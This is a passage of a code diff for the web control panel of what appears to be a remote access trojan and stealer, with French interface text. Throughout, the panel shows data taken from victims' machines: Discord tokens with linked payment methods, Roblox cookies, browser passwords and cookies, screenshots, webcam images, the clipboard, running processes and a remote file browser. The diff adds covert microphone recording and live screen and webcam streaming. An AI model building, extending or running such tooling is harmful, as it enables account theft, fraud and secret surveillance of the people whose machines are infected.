     title.innerHTML += ` <button class="btn btn-icon-only refresh-btn" onclick="refreshCurrentResult()" title="Rafraichir" id="refresh-cmd-btn">
         <i class="fas fa-sync-alt"></i>
     </button>`;
@@ -687,7 +794,6 @@ function showResult(result, commandType, startTime) {
             <div class="sys-item"><span class="sys-label">RAM</span><span>${formatBytes(ramUsed)} / ${formatBytes(r.ram?.total||0)}</span></div>
         </div></div>`;
     }
-    // Discord - with FA icons for each info type
     else if (commandType === 'discord_data') {
         if (!result || result.length === 0) {
             content.innerHTML = '<p style="color:var(--text-muted);text-align:center;padding:40px;">Aucun token Discord trouve.</p>';
@@ -695,6 +801,15 @@ function showResult(result, commandType, startTime) {
             let html = '<div class="discord-grid">';
             result.forEach(t => {
                 const avatar = t.avatar_url || `https://cdn.discordapp.com/embed/avatars/${parseInt(t.discriminator||'0')%5}.png`;
+                
+                let badgesHtml = '';
+                if (t.mfa_enabled) {
+                    badgesHtml += '<span class="badge-mfa"><i class="fas fa-shield-alt"></i> MFA</span>';
+                }
+                if (t.verified) {
+                    badgesHtml += '<span class="badge-verified"><i class="fas fa-check-circle"></i> Verified</span>';
+                }
+                
                 let adminGuildsHtml = '';
                 if (t.admin_guilds && t.admin_guilds.length > 0) {
                     adminGuildsHtml = `<div class="admin-guilds"><p class="section-label">${infoIcons.admin} Admin Permissions:</p><ul class="guild-list">
@@ -709,8 +824,7 @@ function showResult(result, commandType, startTime) {
                     const logosHtml = t.payment_methods.map(p => {
                         const logoSvg = paymentLogos[p.type] || '';
                         const invalidClass = p.invalid ? ' invalid' : '';
-                        const typeName = p.type === 'CreditCard' ? 'Carte de credit' : p.type;
-                        return `<div class="payment-logo${invalidClass}">${logoSvg}<span class="payment-tooltip">${typeName}${p.invalid ? ' (invalide)' : ''}</span></div>`;
+                        return `<div class="payment-logo${invalidClass}">${logoSvg}<span class="payment-tooltip">${p.type === 'CreditCard' ? 'Carte de credit' : p.type}${p.invalid ? ' (invalide)' : ''}</span></div>`;
                     }).join('');
                     paymentHtml = `<div class="divider"></div><div class="payment-info"><p class="section-label">${infoIcons.payment} Payment Methods:</p>
                         <p>Montant: ${t.payment_methods.length} | Valides: ${t.valid_payment_methods || 0}</p>
@@ -720,18 +834,18 @@ function showResult(result, commandType, startTime) {
                 html += `<div class="discord-card">
                     <img src="${avatar}" class="discord-avatar" onerror="this.onerror=null;this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
                     <div class="discord-info">
-                        <h3>${escapeHtml(t.username)}#${t.discriminator}</h3>
+                        <div class="discord-header">
+                            <h3>${escapeHtml(t.username)}#${t.discriminator}</h3>
+                            <div class="discord-badges">${badgesHtml}</div>
+                        </div>
                         <p>${infoIcons.userId} <span class="info-label">User ID:</span> ${t.user_id}</p>
                         <p>${infoIcons.email} <span class="info-label">Email:</span> ${t.email || 'None'}</p>
                         <p>${infoIcons.phone} <span class="info-label">Phone:</span> ${t.phone || 'None'}</p>
-                        <p>${infoIcons.friends} <span class="info-label">Friends:</span> ${t.friends_count || 0}</p>
                         <p>${infoIcons.guilds} <span class="info-label">Guilds:</span> ${t.guilds_count || 0}</p>
                         <div class="divider"></div>
                         ${adminGuildsHtml}
-                        <p>${infoIcons.mfa} <span class="info-label">MFA:</span> ${t.mfa_enabled ? 'True' : 'False'}</p>
                         <p>${infoIcons.flags} <span class="info-label">Flags:</span> ${t.flags || 0}</p>
                         <p>${infoIcons.locale} <span class="info-label">Locale:</span> ${t.locale || 'Unknown'}</p>
-                        <p>${infoIcons.verified} <span class="info-label">Verified:</span> ${t.verified ? 'True' : 'False'}</p>
                         <div class="divider"></div>
                         <div class="nitro-info"><p class="section-label">${infoIcons.nitro} Nitro:</p>
                             <p>Has Nitro: ${t.has_nitro ? 'True' : 'False'}</p>
@@ -741,13 +855,13 @@ function showResult(result, commandType, startTime) {
                         <div class="divider"></div>
                         <p class="section-label">${infoIcons.token} Token:</p>
                         <div class="token-box">${escapeHtml(t.token)}</div>
-                    </div></div>`;
+                    </div>
+                </div>`;
             });
             html += '</div>';
             content.innerHTML = html;
         }
     }
-    // Roblox
     else if (commandType === 'roblox_cookie') {
         if (result && result.cookie) {
             content.innerHTML = `<div class="card-result">
@@ -759,20 +873,20 @@ function showResult(result, commandType, startTime) {
             content.innerHTML = '<div class="card-result"><p style="color:var(--text-muted);text-align:center;">Aucun cookie Roblox trouve.</p></div>';
         }
     }
-    // Screenshot
     else if (commandType === 'screenshot') {
         if (result && result.length) {
             let html = '';
             result.forEach((img, i) => {
                 html += `<div class="screenshot-item" onclick="openLightbox('${img.data}')">
-                    <h3>Moniteur ${img.monitor || (i+1)}</h3><img src="data:image/png;base64,${img.data}" class="screenshot-thumb"></div>`;
+                    <div class="screenshot-header">📸 Moniteur ${img.monitor || (i+1)}</div>
+                    <img src="data:image/png;base64,${img.data}" class="screenshot-thumb">
+                </div>`;
             });
             content.innerHTML = html;
         } else {
             content.innerHTML = '<div class="card-result"><p style="color:var(--text-muted);text-align:center;">Aucune capture.</p></div>';
         }
     }
-    // Webcam
     else if (commandType === 'screenshot_webcam') {
         if (result && result.data) {
             content.innerHTML = `<div class="card-result"><h3><i class="fas fa-video"></i> Webcam</h3>
@@ -782,7 +896,61 @@ function showResult(result, commandType, startTime) {
             content.innerHTML = '<div class="card-result"><p style="color:var(--text-muted);text-align:center;">' + (result?.error || 'Aucune image') + '</p></div>';
         }
     }
-    // File explorer
+    else if (commandType === 'capture_audio') {
+        if (result && result.success && result.data) {
+            content.innerHTML = `<div class="card-result"><h3><i class="fas fa-microphone"></i> Audio (${result.duration}s)</h3>
+                <audio controls src="data:audio/wav;base64,${result.data}" style="width:100%;margin-top:12px;"></audio>
+                <button class="copy-btn" onclick="downloadBase64('${result.data}', 'audio_${Date.now()}.wav')"><i class="fas fa-download"></i> Telecharger</button></div>`;
+        } else {
+            content.innerHTML = `<div class="card-result"><p style="color:var(--text-muted);">${result?.error || 'Erreur capture audio'}</p></div>`;
+        }
+    }
+    else if (commandType === 'stream_screen') {
+        if (result && result.success && result.video_data) {
+            showVideoPlayer(result.video_data, `screen_recording_${Date.now()}.mp4`, result);
+            return;
+        } else if (result && result.frames && result.frames.length > 0) {
+            let html = `<div class="card-result"><h3><i class="fas fa-desktop"></i> Stream Ecran (${result.count} frames)</h3>
+                <div class="stream-controls" style="margin-bottom:12px;">
+                    <button class="btn btn-outline btn-sm" onclick="playStream(this, 'screen_${Date.now()}')"><i class="fas fa-play"></i> Lecture lente</button>
+                    <button class="btn btn-outline btn-sm" onclick="playStreamFast(this, 'screen_${Date.now()}')"><i class="fas fa-forward"></i> Lecture rapide</button>
+                </div>
+                <div id="stream_container_screen_${Date.now()}" style="position:relative;min-height:200px;background:var(--bg-primary);border-radius:8px;overflow:hidden;">
+                    <img id="stream_img_${Date.now()}" style="width:100%;display:none;">
+                </div></div>`;
+            content.innerHTML = html;
+            const framesKey = `frames_${Date.now()}`;
+            window[framesKey] = result.frames;
+            window[`frameIndex_${Date.now()}`] = 0;
+            window[`intervalId_${Date.now()}`] = null;
+            window[`currentStreamId_${Date.now()}`] = Date.now();
+        } else {
+            content.innerHTML = `<div class="card-result"><p style="color:var(--text-muted);">${result?.error || 'Erreur stream ecran'}</p></div>`;
+        }
+    }
+    else if (commandType === 'stream_webcam') {
+        if (result && result.success && result.video_data) {
+            showVideoPlayer(result.video_data, `webcam_recording_${Date.now()}.mp4`, result);
+            return;
+        } else if (result && result.frames && result.frames.length > 0) {
+            let html = `<div class="card-result"><h3><i class="fas fa-video"></i> Stream Webcam (${result.count} frames)</h3>
+                <div class="stream-controls" style="margin-bottom:12px;">
+                    <button class="btn btn-outline btn-sm" onclick="playStream(this, 'webcam_${Date.now()}')"><i class="fas fa-play"></i> Lecture lente</button>
+                    <button class="btn btn-outline btn-sm" onclick="playStreamFast(this, 'webcam_${Date.now()}')"><i class="fas fa-forward"></i> Lecture rapide</button>
+                </div>
+                <div id="stream_container_webcam_${Date.now()}" style="position:relative;min-height:200px;background:var(--bg-primary);border-radius:8px;overflow:hidden;">
+                    <img id="stream_img_${Date.now()}" style="width:100%;display:none;">
+                </div></div>`;
+            content.innerHTML = html;
+            const framesKey = `frames_${Date.now()}`;
+            window[framesKey] = result.frames;
+            window[`frameIndex_${Date.now()}`] = 0;
+            window[`intervalId_${Date.now()}`] = null;
+            window[`currentStreamId_${Date.now()}`] = Date.now();
+        } else {
+            content.innerHTML = `<div class="card-result"><p style="color:var(--text-muted);">${result?.error || 'Erreur stream webcam'}</p></div>`;
+        }
+    }
     else if (commandType === 'file_explorer') {
         if (result && result.error) { showNotification('error', result.error); return; }
         if (result && result.path) {
@@ -797,14 +965,12 @@ function showResult(result, commandType, startTime) {
             document.getElementById('result-modal').style.display = 'flex';
         }
     }
-    // Clipboard
     else if (commandType === 'clipboard') {
         const text = result || '';
         content.innerHTML = `<div class="card-result"><h3><i class="fas fa-copy"></i> Presse-papier</h3>
             <div class="clipboard-content">${escapeHtml(text) || '<span style="color:var(--text-muted);">Vide</span>'}</div>
             ${text ? `<button class="copy-btn" onclick="copyToClipboard('${escapeAttr(text)}')"><i class="fas fa-copy"></i> Copier</button>` : ''}</div>`;
     }
-    // List processes - with pause/stop FA icons
     else if (commandType === 'list_processes') {
         if (result && result.length) {
             window.processListData = result;
@@ -815,10 +981,8 @@ function showResult(result, commandType, startTime) {
         }
         return;
     }
-    // Browser passwords / cookies
     else if (commandType === 'browser_passwords' || commandType === 'browser_cookies') {
         const label = commandType === 'browser_passwords' ? 'Mots de passe' : 'Cookies';
-        const icon = commandType === 'browser_passwords' ? 'fa-key' : 'fa-cookie-bite';
         const allBrowsers = ['Opera', 'Opera GX', 'Firefox', 'Brave', 'Edge'];
         const adminRequired = ['Brave', 'Edge'];
         let collected = {};
@@ -861,7 +1025,6 @@ function showResult(result, commandType, startTime) {
         }
         content.innerHTML = html;
     }
-    // Default
     else if (typeof result === 'string') {
         content.innerHTML = `<div class="card-result"><pre>${escapeHtml(result)}</pre></div>`;
     } else {
@@ -871,7 +1034,71 @@ function showResult(result, commandType, startTime) {
     document.getElementById('result-modal').style.display = 'flex';
 }
 
-// ========== PROCESS TABLE (with FA pause/stop icons) ==========
+function playStream(btn, streamId) {
+    const parts = streamId.split('_');
+    const type = parts[0];
+    const timestamp = parts[1];
+    const frames = window[`frames_${timestamp}`];
+    if (!frames || frames.length === 0) return;
+    
+    if (window[`intervalId_${timestamp}`]) {
+        clearInterval(window[`intervalId_${timestamp}`]);
+        window[`intervalId_${timestamp}`] = null;
+    }
+    
+    window[`frameIndex_${timestamp}`] = 0;
+    const img = document.getElementById(`stream_img_${timestamp}`);
+    if (img) {
+        img.style.display = 'block';
+        img.style.width = '100%';
+    }
+    
+    window[`intervalId_${timestamp}`] = setInterval(() => {
+        const idx = window[`frameIndex_${timestamp}`];
+        if (idx >= frames.length) {
+            clearInterval(window[`intervalId_${timestamp}`]);
+            window[`intervalId_${timestamp}`] = null;
+            showNotification('info', 'Stream termine');
+            return;
+        }
+        if (img) img.src = `data:image/${type === 'screen' ? 'png' : 'jpeg'};base64,${frames[idx]}`;
+        window[`frameIndex_${timestamp}`]++;
+    }, 100);
+}
+
+function playStreamFast(btn, streamId) {
+    const parts = streamId.split('_');
+    const type = parts[0];
+    const timestamp = parts[1];
+    const frames = window[`frames_${timestamp}`];
+    if (!frames || frames.length === 0) return;
+    
+    if (window[`intervalId_${timestamp}`]) {
+        clearInterval(window[`intervalId_${timestamp}`]);
+        window[`intervalId_${timestamp}`] = null;
+    }
+    
+    window[`frameIndex_${timestamp}`] = 0;
+    const img = document.getElementById(`stream_img_${timestamp}`);
+    if (img) {
+        img.style.display = 'block';
+        img.style.width = '100%';
+    }
+    
+    window[`intervalId_${timestamp}`] = setInterval(() => {
+        const idx = window[`frameIndex_${timestamp}`];
+        if (idx >= frames.length) {
+            clearInterval(window[`intervalId_${timestamp}`]);
+            window[`intervalId_${timestamp}`] = null;
+            showNotification('info', 'Stream termine');
+            return;
+        }
+        if (img) img.src = `data:image/${type === 'screen' ? 'png' : 'jpeg'};base64,${frames[idx]}`;
+        window[`frameIndex_${timestamp}`]++;
+    }, 33);
+}
+
+// ========== PROCESS TABLE ==========
 function renderProcessTable(processes) {
     const content = document.getElementById('result-content');
     let html = `<div class="card-result">
@@ -881,13 +1108,15 @@ function renderProcessTable(processes) {
             </button>
         </h3>
         <table class="process-table" id="process-table">
-            <thead><tr>
-                <th class="sortable" onclick="sortProcesses('pid')">PID ${sortIcon('pid')}</th>
-                <th class="sortable" onclick="sortProcesses('name')">Nom ${sortIcon('name')}</th>
-                <th class="sortable" onclick="sortProcesses('cpu_percent')">CPU ${sortIcon('cpu_percent')}</th>
-                <th class="sortable" onclick="sortProcesses('memory_percent')">RAM ${sortIcon('memory_percent')}</th>
-                <th>Actions</th>
-            </tr></thead>
+            <thead>
+                <tr>
+                    <th class="sortable" onclick="sortProcesses('pid')">PID ${sortIcon('pid')}</th>
+                    <th class="sortable" onclick="sortProcesses('name')">Nom ${sortIcon('name')}</th>
+                    <th class="sortable" onclick="sortProcesses('cpu_percent')">CPU ${sortIcon('cpu_percent')}</th>
+                    <th class="sortable" onclick="sortProcesses('memory_percent')">RAM ${sortIcon('memory_percent')}</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
             <tbody id="process-tbody">`;
 
     processes.forEach(proc => {
@@ -995,7 +1224,7 @@ async function toggleSuspendProcess(pid, currentStatus) {
     } catch(e) { showNotification('error', 'Erreur reseau'); }
 }
 
-async function pollCommandResult(commandId, maxAttempts = 30) {
+async function pollCommandResult(commandId, maxAttempts = 60) {
     for (let i = 0; i < maxAttempts; i++) {
         try {
             const res = await fetch(`/api/command_result/${commandId}`);
@@ -1036,6 +1265,11 @@ async function refreshProcessList() {
 let fileExplorerSort = { field: null, asc: true, cycle: 0 };
 
 function renderFileExplorer(path) {
+    let displayPath = path;
+    if (displayPath.startsWith('\\\\?\\')) {
+        displayPath = displayPath.substring(4);
+    }
+    
     const cached = fileExplorerCache[path];
     if (!cached) return;
     fileExplorerCurrentPath = path;
@@ -1073,19 +1307,26 @@ function renderFileExplorer(path) {
             <button class="btn btn-icon-only" onclick="fileExplorerBack()" title="Retour" ${canGoBack?'':'disabled'} style="opacity:${canGoBack?1:0.3};">
                 <i class="fas fa-arrow-left"></i>
             </button>
-            <span style="font-size:13px;color:var(--text-secondary);font-family:'SF Mono','Consolas',monospace;">${escapeHtml(cached.path)}</span>
+            <span style="font-size:13px;color:var(--text-secondary);font-family:'SF Mono','Consolas',monospace;word-break:break-all;">${escapeHtml(displayPath)}</span>
         </div>
-        <table class="file-table"><thead><tr>
-            <th class="sortable" onclick="sortFileExplorer('name')">Nom${fileSortIcon('name')}</th>
-            <th class="sortable" onclick="sortFileExplorer('type')">Type${fileSortIcon('type')}</th>
-            <th class="sortable" onclick="sortFileExplorer('size')">Taille${fileSortIcon('size')}</th>
-            <th class="sortable" onclick="sortFileExplorer('modified')">Modifie${fileSortIcon('modified')}</th>
-            <th></th>
-        </tr></thead><tbody>`;
+        <table class="file-table"><thead>
+            <tr>
+                <th class="sortable" onclick="sortFileExplorer('name')">Nom${fileSortIcon('name')}</th>
+                <th class="sortable" onclick="sortFileExplorer('type')">Type${fileSortIcon('type')}</th>
+                <th class="sortable" onclick="sortFileExplorer('size')">Taille${fileSortIcon('size')}</th>
+                <th class="sortable" onclick="sortFileExplorer('modified')">Modifie${fileSortIcon('modified')}</th>
+                <th></th>
+            </tr>
+        </thead><tbody>`;
 
     if (cached.parent) {
+        let parentPath = cached.parent;
+        if (parentPath.startsWith('\\\\?\\')) {
+            parentPath = parentPath.substring(4);
+        }
         html += `<tr class="clickable-row fe-nav-row" data-path="${escapeHtml(cached.parent)}" data-is-parent="1">
-            <td colspan="5" style="color:var(--accent); cursor:pointer;"><i class="fas fa-arrow-up"></i> ..</td></tr>`;
+            <td colspan="5" style="color:var(--accent); cursor:pointer;"><i class="fas fa-arrow-up"></i> ..</td>
+        </tr>`;
     }
     items.forEach((item, idx) => {
         const icon = item.type === 'directory' ? '<i class="fas fa-folder" style="color:var(--amber);"></i>' : '<i class="fas fa-file" style="color:#8b8fa5;"></i>';
@@ -1101,12 +1342,12 @@ function renderFileExplorer(path) {
             <td>${item.type==='directory'?'Dossier':'Fichier'}</td>
             <td>${item.size_str||'-'}</td>
             <td>${formatDate(item.modified)}</td>
-            <td style="display:flex;gap:4px;">${downloadBtnHtml}${deleteBtnHtml}</td></tr>`;
+            <td style="display:flex;gap:4px;">${downloadBtnHtml}${deleteBtnHtml}</td>
+        </tr>`;
     });
     html += '</tbody></table></div>';
     content.innerHTML = html;
 
-    // Bind events via data attributes (no inline onclick with paths)
     content.querySelectorAll('.fe-nav-row').forEach(row => {
         row.addEventListener('click', () => {
             const p = row.dataset.path;
@@ -1145,19 +1386,24 @@ function sortFileExplorer(field) {
 }
 
 function navigateToDir(path, isParentNav = false) {
-    path = path.replace(/\\\\/g, '\\');
+    let cleanPath = path;
+    if (cleanPath.startsWith('\\\\?\\')) {
+        cleanPath = cleanPath.substring(4);
+    }
+    cleanPath = cleanPath.replace(/\\\\/g, '\\');
+    
     if (!isParentNav && fileExplorerCurrentPath) {
         fileExplorerHistory.push(fileExplorerCurrentPath);
     }
-    const cached = fileExplorerCache[path];
+    const cached = fileExplorerCache[cleanPath];
     if (cached) {
-        renderFileExplorer(path);
+        renderFileExplorer(cleanPath);
         return;
     }
     closeResultModal();
     if (!currentClient) return;
     document.getElementById('command-type').value = 'file_explorer';
-    document.getElementById('command-params').value = path;
+    document.getElementById('command-params').value = cleanPath;
     document.getElementById('command-params-group').style.display = 'block';
     executeCommand();
 }
@@ -1183,13 +1429,15 @@ function showDeleteConfirmModal(remotePath, type, parentPath) {
     _pendingDelete = { remotePath, type, parentPath };
     const label = type === 'directory' ? 'dossier' : 'fichier';
     const modal = document.getElementById('delete-confirm-modal');
+    if (!modal) return;
     document.getElementById('delete-confirm-label').textContent = label;
     document.getElementById('delete-confirm-path').textContent = remotePath;
     modal.style.display = 'flex';
 }
 
 function closeDeleteConfirmModal() {
-    document.getElementById('delete-confirm-modal').style.display = 'none';
+    const modal = document.getElementById('delete-confirm-modal');
+    if (modal) modal.style.display = 'none';
     _pendingDelete = null;
 }
 
@@ -1248,22 +1496,638 @@ function downloadBase64(data, filename) {
 }
 
 function openLightbox(b64data) {
-    document.getElementById('lightbox-img').src = 'data:image/png;base64,' + b64data;
-    document.getElementById('lightbox-modal').style.display = 'block';
+    const img = document.getElementById('lightbox-img');
+    const modal = document.getElementById('lightbox-modal');
+    if (img && modal) {
+        img.src = 'data:image/png;base64,' + b64data;
+        modal.style.display = 'block';
+    }
 }
-function closeLightbox() { document.getElementById('lightbox-modal').style.display = 'none'; }
-function closeModal() { document.getElementById('command-modal').style.display = 'none'; }
+
+function closeLightbox() {
+    const modal = document.getElementById('lightbox-modal');
+    if (modal) modal.style.display = 'none';
+}
+
+function closeModal() {
+    if (isCommandExecuting) {
+        showNotification('info', 'Une commande est en cours, veuillez attendre son execution');
+        return;
+    }
+    const modal = document.getElementById('command-modal');
+    if (modal) modal.style.display = 'none';
+}
+
 function closeResultModal() {
-    document.getElementById('result-modal').style.display = 'none';
-    fileExplorerHistory = [];
-    fileExplorerCurrentPath = null;
+    if (isCommandExecuting) {
+        showNotification('info', 'Une commande est en cours, veuillez attendre son execution');
+        return;
+    }
+    const modal = document.getElementById('result-modal');
+    if (modal) modal.style.display = 'none';
 }
 
 window.onclick = function(e) {
-    if (e.target === document.getElementById('command-modal')) closeModal();
-    if (e.target === document.getElementById('result-modal')) closeResultModal();
-    if (e.target === document.getElementById('delete-confirm-modal')) closeDeleteConfirmModal();
+    return;
 };
+
+function forceCloseModal() {
+    if (isCommandExecuting) {
+        if (currentProcessingCommandId) {
+            cancelRequested = true;
+            isCommandExecuting = false;
+            if (abortController) { 
+                abortController.abort(); 
+                abortController = null; 
+            }
+            clearInterval(processingTimer);
+            document.getElementById('processing-modal').style.display = 'none';
+            document.getElementById('cancel-btn').style.display = 'none';
+            currentCommandId = null;
+            currentProcessingCommandId = null;
+            showNotification('info', 'Commande annulee');
+        }
+    }
+    const modal = document.getElementById('command-modal');
+    if (modal) modal.style.display = 'none';
+}
+
+function forceCloseResultModal() {
+    if (isCommandExecuting) {
+        if (currentProcessingCommandId) {
+            cancelRequested = true;
+            isCommandExecuting = false;
+            if (abortController) { 
+                abortController.abort(); 
+                abortController = null; 
+            }
+            clearInterval(processingTimer);
+            document.getElementById('processing-modal').style.display = 'none';
+            document.getElementById('cancel-btn').style.display = 'none';
+            currentCommandId = null;
+            currentProcessingCommandId = null;
+            showNotification('info', 'Commande annulee');
+        }
+    }
+    const modal = document.getElementById('result-modal');
+    if (modal) modal.style.display = 'none';
+}
+
+// ========== PARAMÈTRES AVANCÉS POUR AUDIO/STREAM ==========
+
+// Détection des périphériques
+async function detectDevices() {
+    try {
+        const res = await fetch('/api/detect_devices', { credentials: 'include' });
+        const data = await res.json();
+        return data;
+    } catch(e) {
+        return { monitors: [], webcams: [], audio_inputs: [], audio_outputs: [] };
+    }
+}
+
+// AUDIO
+function openAudioSettings() {
+    if (!currentClient) { 
+        showNotification('error', 'Sélectionnez un client'); 
+        return;
+    }
+    const modal = document.getElementById('audio-settings-modal');
+    if (!modal) return;
+    modal.style.display = 'flex';
+    loadAudioDevices();
+    
+    document.getElementById('audio-hours').value = currentAudioSettings.hours || 0;
+    document.getElementById('audio-minutes').value = currentAudioSettings.minutes || 1;
+    document.getElementById('audio-seconds').value = currentAudioSettings.seconds || 0;
+    
+    setTimeout(() => {
+        if (currentAudioSettings.input_device !== null && currentAudioSettings.input_device !== undefined) {
+            const inputSelect = document.getElementById('audio-input-device');
+            if (inputSelect) inputSelect.value = currentAudioSettings.input_device;
+        }
+        if (currentAudioSettings.output_device !== null && currentAudioSettings.output_device !== undefined) {
+            const outputSelect = document.getElementById('audio-output-device');
+            if (outputSelect) outputSelect.value = currentAudioSettings.output_device;
+        }
+    }, 100);
+}
+
+async function loadAudioDevices() {
+    try {
+        const devices = await detectDevices();
+        const inputSelect = document.getElementById('audio-input-device');
+        const outputSelect = document.getElementById('audio-output-device');
+        
+        if (!inputSelect || !outputSelect) return;
+        
+        inputSelect.innerHTML = '<option value="">Aucun</option>';
+        outputSelect.innerHTML = '<option value="none">Aucun son</option>';
+        
+        devices.audio_inputs?.forEach(dev => {
+            inputSelect.innerHTML += `<option value="${dev.index}">${escapeHtml(dev.name)} (${dev.channels} canaux)</option>`;
+        });
+        
+        devices.audio_outputs?.forEach(dev => {
+            outputSelect.innerHTML += `<option value="${dev.index}">${escapeHtml(dev.name)} (${dev.channels} canaux)</option>`;
+        });
+        
+        if (currentAudioSettings.input_device !== null && currentAudioSettings.input_device !== undefined) {
+            inputSelect.value = currentAudioSettings.input_device;
+        }
+        if (currentAudioSettings.output_device !== null && currentAudioSettings.output_device !== undefined) {
+            outputSelect.value = currentAudioSettings.output_device;
+        }
+        
+        inputSelect.onchange = () => {
+            currentAudioSettings.input_device = inputSelect.value === '' ? null : parseInt(inputSelect.value);
+        };
+        outputSelect.onchange = () => {
+            currentAudioSettings.output_device = outputSelect.value === 'none' ? null : parseInt(outputSelect.value);
+        };
+        
+    } catch(e) {
+        console.error('Erreur chargement périphériques audio:', e);
+    }
+}
+
+function closeAudioSettingsModal() {
+    const modal = document.getElementById('audio-settings-modal');
+    if (modal) modal.style.display = 'none';
+}
+
+function getAudioSettings() {
+    const hours = parseInt(document.getElementById('audio-hours')?.value) || 0;
+    const minutes = parseInt(document.getElementById('audio-minutes')?.value) || 0;
+    const seconds = parseInt(document.getElementById('audio-seconds')?.value) || 0;
+    const duration = hours * 3600 + minutes * 60 + seconds;
+    
+    if (duration <= 0) {
+        showNotification('error', 'La durée doit être supérieure à 0');
+        return null;
+    }
+    
+    currentAudioSettings = {
+        hours: hours, minutes: minutes, seconds: seconds,
+        input_device: document.getElementById('audio-input-device')?.value === '' ? null : parseInt(document.getElementById('audio-input-device')?.value),
+        output_device: document.getElementById('audio-output-device')?.value === 'none' ? null : parseInt(document.getElementById('audio-output-device')?.value),
+        quality: parseInt(document.querySelector('input[name="audio-quality"]:checked')?.value || 16000),
+        auto_play: document.getElementById('audio-playback')?.checked || false
+    };
+    
+    return {
+        duration: Math.min(duration, 300),
+        sample_rate: currentAudioSettings.quality,
+        device_index: currentAudioSettings.input_device,
+        auto_play: currentAudioSettings.auto_play
+    };
+}
+
+async function startAudioCapture() {
+    const settings = getAudioSettings();
+    if (!settings) return;
+    
+    closeAudioSettingsModal();
+    
+    document.getElementById('processing-modal').style.display = 'flex';
+    document.getElementById('processing-timer').innerText = '0s';
+    let timer = 0;
+    const timerInterval = setInterval(() => {
+        timer++;
+        document.getElementById('processing-timer').innerText = timer + 's';
+    }, 1000);
+    
+    try {
+        const result = await sendCommandWait(currentClient, 'capture_audio', {
+            seconds: settings.duration,
+            sample_rate: settings.sample_rate,
+            device_index: settings.device_index
+        });
+        
+        clearInterval(timerInterval);
+        document.getElementById('processing-modal').style.display = 'none';
+        
+        if (result && result.success && result.data) {
+            const audioBlob = base64ToBlob(result.data, 'audio/wav');
+            const audioUrl = URL.createObjectURL(audioBlob);
+            
+            if (settings.auto_play) {
+                const audio = new Audio(audioUrl);
+                audio.play();
+                showNotification('success', `Audio capturé (${result.duration}s)`);
+            } else {
+                const a = document.createElement('a');
+                a.href = audioUrl;
+                a.download = `audio_${Date.now()}.wav`;
+                a.click();
+                showNotification('success', `Audio capturé (${result.duration}s)`);
+            }
+            URL.revokeObjectURL(audioUrl);
+        } else {
+            showNotification('error', result?.error || 'Échec capture audio');
+        }
+    } catch(e) {
+        clearInterval(timerInterval);
+        document.getElementById('processing-modal').style.display = 'none';
+        showNotification('error', 'Erreur lors de la capture audio');
+    }
+}
+
+// STREAM ÉCRAN
+function openScreenSettings() {
+    if (!currentClient) { 
+        showNotification('error', 'Sélectionnez un client'); 
+        return;
+    }
+    const modal = document.getElementById('screen-settings-modal');
+    if (modal) modal.style.display = 'flex';
+    loadMonitorsAndAudio();
+}
+
+async function loadMonitorsAndAudio() {
+    const devices = await detectDevices();
+    
+    const monitorsDiv = document.getElementById('monitors-list');
+    if (!monitorsDiv) return;
+    
+    monitorsDiv.innerHTML = `
+        <div class="monitor-option ${captureAllMonitors ? 'selected' : ''}" onclick="selectAllMonitors()">
+            <div class="monitor-preview">🖥️</div>
+            <span>Tous les écrans (panorama)</span>
+            <input type="checkbox" class="monitor-checkbox" ${captureAllMonitors ? 'checked' : ''} id="monitor-all">
+        </div>`;
+    
+    devices.monitors?.forEach((mon, idx) => {
+        const isSelected = !captureAllMonitors && selectedMonitors.has(idx);
+        monitorsDiv.innerHTML += `
+            <div class="monitor-option ${isSelected ? 'selected' : ''}" onclick="toggleMonitor(${idx})">
+                <div class="monitor-preview">🖥️ ${idx+1}</div>
+                <span>${mon.width}x${mon.height}</span>
+                <input type="checkbox" class="monitor-checkbox" ${isSelected ? 'checked' : ''} id="monitor-${idx}">
+            </div>`;
+    });
+    
+    const audioSelect = document.getElementById('screen-audio-device');
+    if (audioSelect) {
+        audioSelect.innerHTML = '<option value="">Aucun son</option>';
+        devices.audio_outputs?.forEach(dev => {
+            audioSelect.innerHTML += `<option value="${dev.index}">${escapeHtml(dev.name)}</option>`;
+        });
+    }
+    
+    const captureAudioCheckbox = document.getElementById('screen-capture-audio');
+    if (captureAudioCheckbox) {
+        captureAudioCheckbox.addEventListener('change', (e) => {
+            if (audioSelect) audioSelect.style.display = e.target.checked ? 'block' : 'none';
+        });
+        if (audioSelect) audioSelect.style.display = 'none';
+    }
+}
+
+function selectAllMonitors() {
+    captureAllMonitors = true;
+    selectedMonitors.clear();
+    
+    document.querySelectorAll('.monitor-option').forEach(opt => opt.classList.remove('selected'));
+    const allOption = document.querySelector('.monitor-option:first-child');
+    if (allOption) allOption.classList.add('selected');
+    document.querySelectorAll('.monitor-checkbox').forEach(cb => cb.checked = false);
+    const allCheckbox = document.getElementById('monitor-all');
+    if (allCheckbox) allCheckbox.checked = true;
+}
+
+function toggleMonitor(idx) {
+    captureAllMonitors = false;
+    const allCheckbox = document.getElementById('monitor-all');
+    if (allCheckbox) allCheckbox.checked = false;
+    document.querySelector('.monitor-option:first-child')?.classList.remove('selected');
+    
+    if (selectedMonitors.has(idx)) {
+        selectedMonitors.delete(idx);
+        const cb = document.getElementById(`monitor-${idx}`);
+        if (cb) cb.checked = false;
+        document.getElementById(`monitor-${idx}`)?.closest('.monitor-option')?.classList.remove('selected');
+    } else {
+        selectedMonitors.add(idx);
+        const cb = document.getElementById(`monitor-${idx}`);
+        if (cb) cb.checked = true;
+        document.getElementById(`monitor-${idx}`)?.closest('.monitor-option')?.classList.add('selected');
+    }
+    
+    if (selectedMonitors.size === 0) {
+        selectAllMonitors();
+    }
+}
+
+function closeScreenSettingsModal() {
+    const modal = document.getElementById('screen-settings-modal');
+    if (modal) modal.style.display = 'none';
+}
+
+function getScreenSettings() {
+    const quality = document.querySelector('input[name="screen-quality"]:checked')?.value || '720p';
+    const qualityMap = { '480p': 480, '720p': 720, '1080p': 1080, 'original': null };
+    const duration = parseInt(document.getElementById('screen-duration')?.value) || 30;
+    
+    return {
+        capture_all: captureAllMonitors,
+        monitors: Array.from(selectedMonitors),
+        quality: qualityMap[quality],
+        duration: duration,
+        capture_audio: document.getElementById('screen-capture-audio')?.checked || false,
+        audio_device: document.getElementById('screen-audio-device')?.value === '' ? null : parseInt(document.getElementById('screen-audio-device')?.value)
+    };
+}
+
+async function startScreenStream() {
+    const settings = getScreenSettings();
+    if (!settings.capture_all && settings.monitors.length === 0) {
